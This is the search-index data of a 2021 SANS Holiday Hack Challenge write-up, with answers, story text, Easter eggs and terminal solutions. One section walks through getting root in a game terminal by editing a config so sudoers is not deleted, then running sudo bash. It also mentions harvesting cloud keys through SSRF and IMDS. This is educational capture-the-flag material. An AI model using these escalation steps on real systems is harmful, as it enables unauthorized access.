{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome \u2693\ufe0e Introduction \u2693\ufe0e Hello there and welcome to my 2021 SANS Holiday Hack Challenge write-up. Had you asked me at the beginning of 2021 if I'd be submitting a write-up, I might've hesitated. But each year, as the KringleCon chatter starts to build, so does my excitement, and it just reels me right back in. So, once again, I packed a suitcase, booked a flight, and headed to the North Pole to meet up with Santa, the Elves, and all my KringleCon friends! Similar to last year, there's 3 main sections. This page which contains the introduction, answers, the overall narrative, and final conclusion. Objectives contains the write-ups for the main objectives for which an answer had to be submitted and Terminal Hints has the write-ups for the additional side challenges which provide you with hints to help solve the main objectives. As always, there's a few things worth highlighting like getting root on the IMDS Exploration terminal, bruteforcing the Frostavator, the minor mistake in Prof. Petabyte's FPGA presentation, a bit of cheating here and there , solving terminals with one-liners , the behind the scenes of the WiFi dongle , the very incomplete list of Easter eggs , and all of the custom scripts used throughout the game. 50-page submission limit Each year there's a huge number of write-ups that need to be reviewed by the SANS and Counter Hack teams. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource, some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information. Navigation tip Even with less than 50 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S , F , or / to open up the search dialog. TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! Answers \u2693\ufe0e 1. KringleCon Orientation - Follow Jingle Ringford's instructions to open the gate. 2. Where in the World is Caramel Santaigo? - Play the game or decode the Cookiepella cookie. 3. Thaw Frost Tower's Entrance - Connect to the FROST-Nidus-Setup SSID and use the /api/cooler endpoint to turn up the heat . 4. Slot Machine Investigation - I'm going to have some bouncer trolls bounce you right out of this casino! 5. Strange USB Device - ickymcgoop 6. Shellcode Primer - cyber security knowledge 7. Printer Exploitation - Troll_Pay_Chart.xlsx 8. Kerberoasting on an Open Fire - Kindness 9. Splunk! - whiz 10. Now Hiring! - CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX 11. Customer Complaint Analysis - Flud Hagg Yaqh 12. Frost Tower Website Checkup - clerk 13. FPGA Programming - Write an FPGA program which can generate any requested output frequency. Challenges \u2693\ufe0e Name Event Floor Area Terminal Objective Jingle Ringford NP - Orientation - KringleCon Orientation Tangle Coalbox KC 1 Courtyard - Where is Caramel Santaigo? Piney Sappington KC 1 Courtyard Document Analysis Where is Caramel Santaigo? Grimy McTrollkins NP - The North Pole - Thaw Frost Tower's Entrance Greasy GopherGuts NP - The North Pole Grepping for Gold Thaw Frost Tower's Entrance Hubris Selfington FF 1 Frost Tower Lobby - Slot Machine Investigation Noel Boetie NP - The North Pole Logic Munchers Slot Machine Investigation Morcel Nougat KC 2 Speaker UNpreparedness Room - Strange USB Device Jewel Loggins KC 2 Talks Lobby IPv6 Sandbox Strange USB Device Ruby Cyster FF 16 Jack's Office - Shellcode Primer Chimney Scissorsticks KC R NetWars Holiday Hero Shellcode Primer Ruby Cyster FF 16 Jack's Office - Printer Exploitation Eve Snowshoes KC 3 Santa's office HoHo... No Kerberoasting on an Open Fire Angel Candysalt KC 1 Great Room - Splunk! Fitzy Shortstack KC 1 Entry Yara Analysis Splunk! Noxious O\u2019Dor FF 16 Jack's Restroom IMDS Exploration Now Hiring! Pat Tronizer FF 2 Talks Lobby - Customer Complaint Analysis Tinsel Upatree KC 1 Kitchen Strace Ltrace Retrace Customer Complaint Analysis Ingreta Tude FF 16 Jack's Studio - Frost Tower Website Checkup Ribb Bonbowford KC 1 Dining Room The Elf C0de Frost Tower Website Checkup Crunchy Squishter FF R Frost Tower Rooftop - FPGA Programming Grody Goiterson FF R Frost tower Lobby Frostavator FPGA Programming Conclusion \u2693\ufe0e Narrative Listen children to a story that was written in the cold 'Bout a Kringle and his castle hosting hackers, meek and bold Then from somewhere came another, built his tower tall and proud Surely he, our Frosty villain hides intentions 'neath a shroud So begins Jack's reckless mission: gather trolls to win a war Build a con that's fresh and shiny, has this yet been done before? Is his Fest more feint than folly? Some have noticed subtle clues Running 'round and raiding repos, stealing Santa's Don'ts and Do's Misdirected, scheming, grasping, Frost intends to seize the day Funding research with a gift shop, can Frost build the better sleigh? Lo, we find unlikely allies: trolls within Jack's own command Doubting Frost and searching motive, questioning his dark demand Is our Jack just lost and rotten - one more outlaw stomping toes? Why then must we piece together cludgy, wacky radios? With this object from the heavens, Frost must know his cover's blown Hearkening from distant planet! We the heroes should have known Go ahead and hack your neighbor, go ahead and phish a friend Do it in the name of holidays, you can justify it at year's end There won't be any retweets praising you, come disclosure day But on the snowy evening after? Still Kris Kringle rides the sleigh Icy Sickles We come in peace! I am Icy Sickles from ice Planet Frost. Many centuries ago, we Frostian trolls sent an expedition to study your planet and peoples. Jack Frost, scion of Planet Frost\u2019s ruling family, captained that long-ago mission, which carried many hundreds of our people to your planet to conduct our research. Erin Fection I am Erin Fection, the pilot of this interstellar spaceship. Our first expedition established a base in the land of Oz, where our researchers became known as \u201cMunchkins.\u201d We received a message from them long ago about a Great Schism, where the Frostian expedition split into two warring factions: Munchkins and Elves. Thankfully, they managed to establish an uneasy peace by relocating the Elves to the North Pole. Since then, we have heard nothing from the expedition. They went interstellar radio silent. Until NOW. Buttercup I am Buttercup, Princess of ice Planet Frost. Thanks to your help, we received the message from the device summoning us back to Earth to address the recent unpleasantness. We had no idea that Jack Frost would cause such trouble! We sincerely apologize. We will take Jack back home to Planet Frost, along with all the other trolls. The Elves and Munchkins, of course, can remain if they opt to do so. Fear not, we WILL bring Jack and any guilty trolls to justice for their infractions. They will not bother your planet any longer. Again, we apologize for all the troubles he has caused, and we sincerely THANK YOU for your help! And, now that you've helped us solve everything, feel free to show off your skills with some swag - only for our victors! Jack Frost I was just having a little fun. C\u2019mon, man! And, I was just getting started! I had such big plans! I don\u2019t want to go home!!! Santa The Frostians have reached out to me via video link. They\u2019ve explained to me all that has happened. I\u2019d like to thank you for your truly excellent work in foiling Jack\u2019s plans and ensuring that he is finally brought to justice. On behalf of all of us here at the North Pole, we wish you and yours a happy and healthy Holiday Season. Thank you and HAPPY HOLIDAYS from me and all of the elves. Ho Ho Ho!","title":"Welcome"},{"location":"#welcome","text":"","title":"Welcome"},{"location":"#introduction","text":"Hello there and welcome to my 2021 SANS Holiday Hack Challenge write-up. Had you asked me at the beginning of 2021 if I'd be submitting a write-up, I might've hesitated. But each year, as the KringleCon chatter starts to build, so does my excitement, and it just reels me right back in. So, once again, I packed a suitcase, booked a flight, and headed to the North Pole to meet up with Santa, the Elves, and all my KringleCon friends! Similar to last year, there's 3 main sections. This page which contains the introduction, answers, the overall narrative, and final conclusion. Objectives contains the write-ups for the main objectives for which an answer had to be submitted and Terminal Hints has the write-ups for the additional side challenges which provide you with hints to help solve the main objectives. As always, there's a few things worth highlighting like getting root on the IMDS Exploration terminal, bruteforcing the Frostavator, the minor mistake in Prof. Petabyte's FPGA presentation, a bit of cheating here and there , solving terminals with one-liners , the behind the scenes of the WiFi dongle , the very incomplete list of Easter eggs , and all of the custom scripts used throughout the game. 50-page submission limit Each year there's a huge number of write-ups that need to be reviewed by the SANS and Counter Hack teams. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource, some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information. Navigation tip Even with less than 50 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S , F , or / to open up the search dialog. TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order!","title":"Introduction"},{"location":"#answers","text":"1. KringleCon Orientation - Follow Jingle Ringford's instructions to open the gate. 2. Where in the World is Caramel Santaigo? - Play the game or decode the Cookiepella cookie. 3. Thaw Frost Tower's Entrance - Connect to the FROST-Nidus-Setup SSID and use the /api/cooler endpoint to turn up the heat . 4. Slot Machine Investigation - I'm going to have some bouncer trolls bounce you right out of this casino! 5. Strange USB Device - ickymcgoop 6. Shellcode Primer - cyber security knowledge 7. Printer Exploitation - Troll_Pay_Chart.xlsx 8. Kerberoasting on an Open Fire - Kindness 9. Splunk! - whiz 10. Now Hiring! - CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX 11. Customer Complaint Analysis - Flud Hagg Yaqh 12. Frost Tower Website Checkup - clerk 13. FPGA Programming - Write an FPGA program which can generate any requested output frequency.","title":"Answers"},{"location":"#challenges","text":"Name Event Floor Area Terminal Objective Jingle Ringford NP - Orientation - KringleCon Orientation Tangle Coalbox KC 1 Courtyard - Where is Caramel Santaigo? Piney Sappington KC 1 Courtyard Document Analysis Where is Caramel Santaigo? Grimy McTrollkins NP - The North Pole - Thaw Frost Tower's Entrance Greasy GopherGuts NP - The North Pole Grepping for Gold Thaw Frost Tower's Entrance Hubris Selfington FF 1 Frost Tower Lobby - Slot Machine Investigation Noel Boetie NP - The North Pole Logic Munchers Slot Machine Investigation Morcel Nougat KC 2 Speaker UNpreparedness Room - Strange USB Device Jewel Loggins KC 2 Talks Lobby IPv6 Sandbox Strange USB Device Ruby Cyster FF 16 Jack's Office - Shellcode Primer Chimney Scissorsticks KC R NetWars Holiday Hero Shellcode Primer Ruby Cyster FF 16 Jack's Office - Printer Exploitation Eve Snowshoes KC 3 Santa's office HoHo... No Kerberoasting on an Open Fire Angel Candysalt KC 1 Great Room - Splunk! Fitzy Shortstack KC 1 Entry Yara Analysis Splunk! Noxious O\u2019Dor FF 16 Jack's Restroom IMDS Exploration Now Hiring! Pat Tronizer FF 2 Talks Lobby - Customer Complaint Analysis Tinsel Upatree KC 1 Kitchen Strace Ltrace Retrace Customer Complaint Analysis Ingreta Tude FF 16 Jack's Studio - Frost Tower Website Checkup Ribb Bonbowford KC 1 Dining Room The Elf C0de Frost Tower Website Checkup Crunchy Squishter FF R Frost Tower Rooftop - FPGA Programming Grody Goiterson FF R Frost tower Lobby Frostavator FPGA Programming","title":"Challenges"},{"location":"#conclusion","text":"Narrative Listen children to a story that was written in the cold 'Bout a Kringle and his castle hosting hackers, meek and bold Then from somewhere came another, built his tower tall and proud Surely he, our Frosty villain hides intentions 'neath a shroud So begins Jack's reckless mission: gather trolls to win a war Build a con that's fresh and shiny, has this yet been done before? Is his Fest more feint than folly? Some have noticed subtle clues Running 'round and raiding repos, stealing Santa's Don'ts and Do's Misdirected, scheming, grasping, Frost intends to seize the day Funding research with a gift shop, can Frost build the better sleigh? Lo, we find unlikely allies: trolls within Jack's own command Doubting Frost and searching motive, questioning his dark demand Is our Jack just lost and rotten - one more outlaw stomping toes? Why then must we piece together cludgy, wacky radios? With this object from the heavens, Frost must know his cover's blown Hearkening from distant planet! We the heroes should have known Go ahead and hack your neighbor, go ahead and phish a friend Do it in the name of holidays, you can justify it at year's end There won't be any retweets praising you, come disclosure day But on the snowy evening after? Still Kris Kringle rides the sleigh Icy Sickles We come in peace! I am Icy Sickles from ice Planet Frost. Many centuries ago, we Frostian trolls sent an expedition to study your planet and peoples. Jack Frost, scion of Planet Frost\u2019s ruling family, captained that long-ago mission, which carried many hundreds of our people to your planet to conduct our research. Erin Fection I am Erin Fection, the pilot of this interstellar spaceship. Our first expedition established a base in the land of Oz, where our researchers became known as \u201cMunchkins.\u201d We received a message from them long ago about a Great Schism, where the Frostian expedition split into two warring factions: Munchkins and Elves. Thankfully, they managed to establish an uneasy peace by relocating the Elves to the North Pole. Since then, we have heard nothing from the expedition. They went interstellar radio silent. Until NOW. Buttercup I am Buttercup, Princess of ice Planet Frost. Thanks to your help, we received the message from the device summoning us back to Earth to address the recent unpleasantness. We had no idea that Jack Frost would cause such trouble! We sincerely apologize. We will take Jack back home to Planet Frost, along with all the other trolls. The Elves and Munchkins, of course, can remain if they opt to do so. Fear not, we WILL bring Jack and any guilty trolls to justice for their infractions. They will not bother your planet any longer. Again, we apologize for all the troubles he has caused, and we sincerely THANK YOU for your help! And, now that you've helped us solve everything, feel free to show off your skills with some swag - only for our victors! Jack Frost I was just having a little fun. C\u2019mon, man! And, I was just getting started! I had such big plans! I don\u2019t want to go home!!! Santa The Frostians have reached out to me via video link. They\u2019ve explained to me all that has happened. I\u2019d like to thank you for your truly excellent work in foiling Jack\u2019s plans and ensuring that he is finally brought to justice. On behalf of all of us here at the North Pole, we wish you and yours a happy and healthy Holiday Season. Thank you and HAPPY HOLIDAYS from me and all of the elves. Ho Ho Ho!","title":"Conclusion"},{"location":"easter_eggs/","text":"Easter Eggs \u2693\ufe0e Every year my plan is to find all the Easter eggs and every year I fail miserably. It's simply amazing how many things you can find once you start looking around for them, like movie references, jokes, nods to popular culture, memes, secret areas, references to past Holiday Hack Challenge, and funny WebSocket response messages. Below, in no particular order, are just a few. Four Calling Birds \u2693\ufe0e Probably to no one's surprise, this year's event announcement continues the KringleCon title trend set by previous iterations. 2019 was named KringleCon 2: Turtle Doves , in 2020 it was KringleCon 3: French Hens , and this time around we get KringleCon 4: Calling Birds which is a reference to the fourth verse from the Twelve Days of Christmas carol. The Twelve Days Of Christmas ... On the second day of Christmas My true love gave to me: Two turtle doves ... On the third day of Christmas My true love gave to me: Three french hens ... On the forth day of Christmas My true love gave to me: Four calling birds ... The Third Kind \u2693\ufe0e The big reveal at this year's event is of course the spaceship on the roof of Frost Tower. The Third Kind map destination, the Speak & Spell music , and the sound the spaceship makes as it lands are of course direct references to Spielberg's movie Close Encounters of the Third Kind . It seemed only fitting to make this year's write-up poster a reference to that movie as well. Klatu Barada Nikto! \u2693\ufe0e There's a second science-fiction movie reference when you first talk to Numby Chilblain on the Frost Tower rooftop and he says \"Klatu Barada Nikto!\" . This is a nod to the 1951 movie The Day the Earth Stood Still . The Discworld \u2693\ufe0e If you ride the Santavator or Frostavator to a floor that does not exist you end up in an area named __Shenanigans__ . The room's backdrop is an image of the Discworld , a fictional setting for all of Terry Pratchett's Discworld fantasy novels. How to get here is explained as part of the Frostavator terminal write-up. Those darn interns! \u2693\ufe0e Using get_ssrf_data.py to retrieve /var/www/html/index.html from the Now Hiring! challenge reveals a reference to the SolarWinds supply chain attack, where an intern was blamed for the insecure solarwinds123 password. Carmen Sandiego \u2693\ufe0e The second challenge is a reference to the 1985 video game Where in the World is Carmen Sandiego . Jason... the flush handle \u2693\ufe0e Anyone who's played SANS Holiday Hack Challenge a few times before know he's always hidden somewhere in the game. This time around poor Jason gets assigned the not so glamorous role of toilet flush handle. At least it's a golden one. There's also some whimsicalness going on with some of the image assets in Jack's restroom. First, the asset name for the toilet image is terrrlet.png which, according to Urban Dictionary , is how some people pronounce toilet. Secondly, the back , left , and right walls are covered by transparent image overlays containing an assortment of signatures. Rihanna's umbrella \u2693\ufe0e Another funny asset name can be found as part of the satellite dish contraption that Crunchy Squishter created to communicate with the Frostians. The asset name of the umbrella, ellaellaeheheh.png , is a reference to the song Umbrella by Rihanna. Printer queue document \u2693\ufe0e One of the PDF documents in the printer queue is a reference to How to Win Friends and Influence People by Dale Carnegie. Painting peephole \u2693\ufe0e Last year's painting has been replaced, leaving a discolored outline on the wall. The peephole eyes are still present though! Castle artwork \u2693\ufe0e It looks like last year's artwork , which is cut from a single image, is still hanging on the walls in Santa's castle. If you download all the textures from https://2021.kringlecon.com/textures/art/f{1-39}.png , you can recreate this painting of Jack Frost. Ille te videt dum dormit \u2693\ufe0e The phrase Ille te videt dum dormit on the ElfU logo is Latin and translates to he sees you while you're sleeping . Web socket messages \u2693\ufe0e The WebSocket at wss://2021.kringlecon.com/ws is a lot of fun to play around with. The WS_OHHIMARK and DENNIS_NEDRY response message types are references to the movies The Room and Jurassic Park , respectively. WS_OHHIMARK DENNIS_NEDRY Stolen KringleCon talks \u2693\ufe0e Pat Tronizer I'm SO glad to have all these first-rate talks here. We issued a Call for Talks, but only one person responded\u2026 We put him in track 1. But Jack came up with an ingenious way to borrow additional talks for FrostFest! You can hardly tell where we got these great speakers! Jack Frost put absolutely 0 effort in creating original content which is pretty apparent when you put the KringleCon 4 and FrostFest speaker agendas side by side. The best part though is the camcorder overlay which was added to all the KringleCon talks. Portrait painting \u2693\ufe0e The portrait painting in Jack's studio was a key plot item in last year's events. It features Ed Skoudis as Santa Claus and was painted by Ed's daughter Jessica Skoudis. The initials on the portrait not only refer to Jack Frost: Santa , as per the narrative, but are in fact Jessica's initials. The items on the desk are references to past Holiday Hack Challenges . Item Holiday Hack Challenge 1 Challenge coin First introduced as an award in HHC 2019 2 Tardis Seen on the dorm wall in HHC 2019 3 Cranberry Pi First appeared in HHC 2018 4 Gnome legs Also created by Jessica Skoudis and featured in HHC 2015 5 Enigma machine Seen in an image for HHC 2012","title":"Easter Eggs"},{"location":"easter_eggs/#easter-eggs","text":"Every year my plan is to find all the Easter eggs and every year I fail miserably. It's simply amazing how many things you can find once you start looking around for them, like movie references, jokes, nods to popular culture, memes, secret areas, references to past Holiday Hack Challenge, and funny WebSocket response messages. Below, in no particular order, are just a few.","title":"Easter Eggs"},{"location":"easter_eggs/#four-calling-birds","text":"Probably to no one's surprise, this year's event announcement continues the KringleCon title trend set by previous iterations. 2019 was named KringleCon 2: Turtle Doves , in 2020 it was KringleCon 3: French Hens , and this time around we get KringleCon 4: Calling Birds which is a reference to the fourth verse from the Twelve Days of Christmas carol. The Twelve Days Of Christmas ... On the second day of Christmas My true love gave to me: Two turtle doves ... On the third day of Christmas My true love gave to me: Three french hens ... On the forth day of Christmas My true love gave to me: Four calling birds ...","title":"Four Calling Birds"},{"location":"easter_eggs/#the-third-kind","text":"The big reveal at this year's event is of course the spaceship on the roof of Frost Tower. The Third Kind map destination, the Speak & Spell music , and the sound the spaceship makes as it lands are of course direct references to Spielberg's movie Close Encounters of the Third Kind . It seemed only fitting to make this year's write-up poster a reference to that movie as well.","title":"The Third Kind"},{"location":"easter_eggs/#klatu-barada-nikto","text":"There's a second science-fiction movie reference when you first talk to Numby Chilblain on the Frost Tower rooftop and he says \"Klatu Barada Nikto!\" . This is a nod to the 1951 movie The Day the Earth Stood Still .","title":"Klatu Barada Nikto!"},{"location":"easter_eggs/#the-discworld","text":"If you ride the Santavator or Frostavator to a floor that does not exist you end up in an area named __Shenanigans__ . The room's backdrop is an image of the Discworld , a fictional setting for all of Terry Pratchett's Discworld fantasy novels. How to get here is explained as part of the Frostavator terminal write-up.","title":"The Discworld"},{"location":"easter_eggs/#those-darn-interns","text":"Using get_ssrf_data.py to retrieve /var/www/html/index.html from the Now Hiring! challenge reveals a reference to the SolarWinds supply chain attack, where an intern was blamed for the insecure solarwinds123 password.","title":"Those darn interns!"},{"location":"easter_eggs/#carmen-sandiego","text":"The second challenge is a reference to the 1985 video game Where in the World is Carmen Sandiego .","title":"Carmen Sandiego"},{"location":"easter_eggs/#jason-the-flush-handle","text":"Anyone who's played SANS Holiday Hack Challenge a few times before know he's always hidden somewhere in the game. This time around poor Jason gets assigned the not so glamorous role of toilet flush handle. At least it's a golden one. There's also some whimsicalness going on with some of the image assets in Jack's restroom. First, the asset name for the toilet image is terrrlet.png which, according to Urban Dictionary , is how some people pronounce toilet. Secondly, the back , left , and right walls are covered by transparent image overlays containing an assortment of signatures.","title":"Jason... the flush handle"},{"location":"easter_eggs/#rihannas-umbrella","text":"Another funny asset name can be found as part of the satellite dish contraption that Crunchy Squishter created to communicate with the Frostians. The asset name of the umbrella, ellaellaeheheh.png , is a reference to the song Umbrella by Rihanna.","title":"Rihanna's umbrella"},{"location":"easter_eggs/#printer-queue-document","text":"One of the PDF documents in the printer queue is a reference to How to Win Friends and Influence People by Dale Carnegie.","title":"Printer queue document"},{"location":"easter_eggs/#painting-peephole","text":"Last year's painting has been replaced, leaving a discolored outline on the wall. The peephole eyes are still present though!","title":"Painting peephole"},{"location":"easter_eggs/#castle-artwork","text":"It looks like last year's artwork , which is cut from a single image, is still hanging on the walls in Santa's castle. If you download all the textures from https://2021.kringlecon.com/textures/art/f{1-39}.png , you can recreate this painting of Jack Frost.","title":"Castle artwork"},{"location":"easter_eggs/#ille-te-videt-dum-dormit","text":"The phrase Ille te videt dum dormit on the ElfU logo is Latin and translates to he sees you while you're sleeping .","title":"Ille te videt dum dormit"},{"location":"easter_eggs/#web-socket-messages","text":"The WebSocket at wss://2021.kringlecon.com/ws is a lot of fun to play around with. The WS_OHHIMARK and DENNIS_NEDRY response message types are references to the movies The Room and Jurassic Park , respectively. WS_OHHIMARK DENNIS_NEDRY","title":"Web socket messages"},{"location":"easter_eggs/#stolen-kringlecon-talks","text":"Pat Tronizer I'm SO glad to have all these first-rate talks here. We issued a Call for Talks, but only one person responded\u2026 We put him in track 1. But Jack came up with an ingenious way to borrow additional talks for FrostFest! You can hardly tell where we got these great speakers! Jack Frost put absolutely 0 effort in creating original content which is pretty apparent when you put the KringleCon 4 and FrostFest speaker agendas side by side. The best part though is the camcorder overlay which was added to all the KringleCon talks.","title":"Stolen KringleCon talks"},{"location":"easter_eggs/#portrait-painting","text":"The portrait painting in Jack's studio was a key plot item in last year's events. It features Ed Skoudis as Santa Claus and was painted by Ed's daughter Jessica Skoudis. The initials on the portrait not only refer to Jack Frost: Santa , as per the narrative, but are in fact Jessica's initials. The items on the desk are references to past Holiday Hack Challenges . Item Holiday Hack Challenge 1 Challenge coin First introduced as an award in HHC 2019 2 Tardis Seen on the dorm wall in HHC 2019 3 Cranberry Pi First appeared in HHC 2018 4 Gnome legs Also created by Jessica Skoudis and featured in HHC 2015 5 Enigma machine Seen in an image for HHC 2012","title":"Portrait painting"},{"location":"hints/h10/","text":"IMDS Exploration \u2693\ufe0e Elf : Noxious O'Dor Direct link : imds terminal Objective : Now Hiring! Request \u2693\ufe0e Noxious O'Dor Hey, this is the executive restroom. Wasn't that door closed? I'm Noxious O'Dor. And I've gotta say, I think that Jack Frost is just messed up. I mean, I'm no expert, but his effort to \"win\" against Santa by going bigger and bolder seems bad. You know, I'm having some trouble with this IMDS exploration. I'm hoping you can give me some help in solving it. If you do, I'll be happy to trade you for some hints on SSRF! I've been studying up on that and have some good ideas on how to attack it! Solution \u2693\ufe0e Welcome message \ud83c\udf84\ud83c\udf84\ud83c\udf84 Prof. Petabyte here. In this lesson you'll continue to build your cloud asset skills, \ud83c\udf84\ud83c\udf84\ud83c\udf84 interacting with the Instance Metadata Service (IMDS) using curl. \ud83c\udf84\ud83c\udf84\ud83c\udf84 \ud83c\udf84\ud83c\udf84\ud83c\udf84 If you get stuck, run 'hint' for assitance. \ud83c\udf84\ud83c\udf84\ud83c\udf84 This terminal takes you through what IMDS is and how you can interact with the service by going over various sample curl commands. Instead of rehashing the same commands here and calling it a write-up, let's look at some other fun things we can do, like skipping past all the questions to get the achievement or elevating our privileges to root ! During Prof. Petabyte's lesson you're asked to type next a few times. This command actually works for every single question and so a one-liner like for i in {1..18}; do next; sleep 1; done will award you the achievement with minimal effort. Getting root Skipping past all the questions is fun, but getting a root shell is better! Start by using Ctrl + c to break out of the startup sequence. If you time it right you'll prevent the bottom pane from fully loading and end up logged in as the init user. In the user's home folder you'll find a tmuxp session configuration file (i.e., mysession.yaml ), the top_pane and bottom_pane setuid binaries that are run in each tmux pane, and a questions_answers.json file. During terminal startup there's an /etc/sudoers file present with an entry for the elfu user. However, as top_pane parses questions_answers.json and loads the data for the first question, it'll execute 2 additional commands, one being sudo rm /etc/sudoers which removes elfu 's sudo permissions again. To get a root shell, open a new tmux window using Ctrl + b c (line 2), kill the old processes (lines 3-5), take ownership of the files so we can edit them (lines 6-9), change the session name in mysession.yaml (line 10), edit questions_answers.json so it doesn't delete /etc/sudoers (line 11), and load mysession.yaml to initialize everything again (line 12). We've now switched to the elfu account but with the /etc/sudoers file still in place, meaning sudo bash will give us our root shell. Terminal commands 1 2 3 4 5 6 7 8 9 10 11 12 13 # ctrl+c out of the startup sequence # ctrl+b c to open a new tmux window ps ax # list all processes kill -9 43 # kill the old top pane bash process kill -9 79 # kill the old bottom pane bash process cp questions_answers.json questions_answers_copy.json # create a writable copy mv -f questions_answers_copy.json questions_answers.json # rename the file to replace the original cp mysession.yaml mysession_copy.yaml # create a writable copy mv -f mysession_copy.yaml mysession.yaml # rename the file to replace the original sed -i 's/ElfU/Elfu2Root/g' mysession.yaml # edit the session name to Elfu2Root pico questions_answers.json # remove the \"sudo rm /etc/sudoers\" line (e.g., pico, vi) tmuxp load mysession.yaml # load the tmux session again sudo bash # leverage elfu's sudo permissions Putting all of the above into practice looks something like this. Response \u2693\ufe0e Noxious O'Dor Phew! That is something extra! Oh, and you solved the challenge too? Great! Cloud assets are interesting targets for attackers. Did you know they automatically get IMDS access? I'm very concerned about the combination of SSRF and IMDS access. Did you know it's possible to harvest cloud keys through SSRF and IMDS attacks? Dr. Petabyte told us, \"anytime you see URL as an input, test for SSRF.\" With an SSRF attack, we can make the server request a URL. This can reveal valuable data! The AWS documentation for IMDS is interesting reading.","title":"IMDS Exploration"},{"location":"hints/h10/#imds-exploration","text":"Elf : Noxious O'Dor Direct link : imds terminal Objective : Now Hiring!","title":"IMDS Exploration"},{"location":"hints/h10/#request","text":"Noxious O'Dor Hey, this is the executive restroom. Wasn't that door closed? I'm Noxious O'Dor. And I've gotta say, I think that Jack Frost is just messed up. I mean, I'm no expert, but his effort to \"win\" against Santa by going bigger and bolder seems bad. You know, I'm having some trouble with this IMDS exploration. I'm hoping you can give me some help in solving it. If you do, I'll be happy to trade you for some hints on SSRF! I've been studying up on that and have some good ideas on how to attack it!","title":"Request"},{"location":"hints/h10/#solution","text":"Welcome message \ud83c\udf84\ud83c\udf84\ud83c\udf84 Prof. Petabyte here. In this lesson you'll continue to build your cloud asset skills, \ud83c\udf84\ud83c\udf84\ud83c\udf84 interacting with the Instance Metadata Service (IMDS) using curl. \ud83c\udf84\ud83c\udf84\ud83c\udf84 \ud83c\udf84\ud83c\udf84\ud83c\udf84 If you get stuck, run 'hint' for assitance. \ud83c\udf84\ud83c\udf84\ud83c\udf84 This terminal takes you through what IMDS is and how you can interact with the service by going over various sample curl commands. Instead of rehashing the same commands here and calling it a write-up, let's look at some other fun things we can do, like skipping past all the questions to get the achievement or elevating our privileges to root ! During Prof. Petabyte's lesson you're asked to type next a few times. This command actually works for every single question and so a one-liner like for i in {1..18}; do next; sleep 1; done will award you the achievement with minimal effort. Getting root Skipping past all the questions is fun, but getting a root shell is better! Start by using Ctrl + c to break out of the startup sequence. If you time it right you'll prevent the bottom pane from fully loading and end up logged in as the init user. In the user's home folder you'll find a tmuxp session configuration file (i.e., mysession.yaml ), the top_pane and bottom_pane setuid binaries that are run in each tmux pane, and a questions_answers.json file. During terminal startup there's an /etc/sudoers file present with an entry for the elfu user. However, as top_pane parses questions_answers.json and loads the data for the first question, it'll execute 2 additional commands, one being sudo rm /etc/sudoers which removes elfu 's sudo permissions again. To get a root shell, open a new tmux window using Ctrl + b c (line 2), kill the old processes (lines 3-5), take ownership of the files so we can edit them (lines 6-9), change the session name in mysession.yaml (line 10), edit questions_answers.json so it doesn't delete /etc/sudoers (line 11), and load mysession.yaml to initialize everything again (line 12). We've now switched to the elfu account but with the /etc/sudoers file still in place, meaning sudo bash will give us our root shell. Terminal commands 1 2 3 4 5 6 7 8 9 10 11 12 13 # ctrl+c out of the startup sequence # ctrl+b c to open a new tmux window ps ax # list all processes kill -9 43 # kill the old top pane bash process kill -9 79 # kill the old bottom pane bash process cp questions_answers.json questions_answers_copy.json # create a writable copy mv -f questions_answers_copy.json questions_answers.json # rename the file to replace the original cp mysession.yaml mysession_copy.yaml # create a writable copy mv -f mysession_copy.yaml mysession.yaml # rename the file to replace the original sed -i 's/ElfU/Elfu2Root/g' mysession.yaml # edit the session name to Elfu2Root pico questions_answers.json # remove the \"sudo rm /etc/sudoers\" line (e.g., pico, vi) tmuxp load mysession.yaml # load the tmux session again sudo bash # leverage elfu's sudo permissions Putting all of the above into practice looks something like this.","title":"Solution"},{"location":"hints/h10/#response","text":"Noxious O'Dor Phew! That is something extra! Oh, and you solved the challenge too? Great! Cloud assets are interesting targets for attackers. Did you know they automatically get IMDS access? I'm very concerned about the combination of SSRF and IMDS access. Did you know it's possible to harvest cloud keys through SSRF and IMDS attacks? Dr. Petabyte told us, \"anytime you see URL as an input, test for SSRF.\" With an SSRF attack, we can make the server request a URL. This can reveal valuable data! The AWS documentation for IMDS is interesting reading.","title":"Response"},{"location":"hints/h11/","text":"Strace Ltrace Retrace \u2693\ufe0e Elf : Tinsel Upatree Direct link : ltrace terminal Objective : Customer Complaint Analysis Request \u2693\ufe0e Tinsel Upatree Hiya hiya, I'm Tinsel Upatree! Say, do you know what's going on next door? I'm a bit worried about the whole FrostFest event. It feels a bit... ill-conceived, somehow. Nasty even. Well, regardless \u2013 and more to the point, what do you know about tracing processes in Linux? We rebuilt this here Cranberry Pi that runs the cotton candy machine, but we seem to be missing a file. Do you think you can use strace or ltrace to help us rebuild the missing config? We'd like to help some of our favorite children enjoy the sweet spun goodness again! And, if you help me with this, I'll give you some hints about using Wireshark filters to look for unusual options that might help you achieve Objectives here at the North Pole. Solution \u2693\ufe0e Welcome message ================================================================================ Please, we need your help! The cotton candy machine is broken! We replaced the SD card in the Cranberry Pi that controls it and reinstalled the software. Now it's complaining that it can't find a registration file! Perhaps you could figure out what the cotton candy software is looking for... ================================================================================ Debugging tools like ltrace allow us to trace a program's execution flow by intercepting all of the dynamic library and system calls the program makes. Its verbose output can help to determine where and why exactly things are going wrong. Start by running the program normally using ./make_the_candy to confirm we're indeed missing a configuration file. Use ltrace ./make_the_candy to trace the program's execution and reveal the expected file name is registration.json . Create the registration file with touch registration.json and run ltrace again. This time we get a different message telling us that the program is trying to get or read a line from the file. Since registration.json is still empty, this fails as well. So, add some dummy data using echo dummy > registration.json and keep repeating the process. From this point on the program will try to read data from the configuration 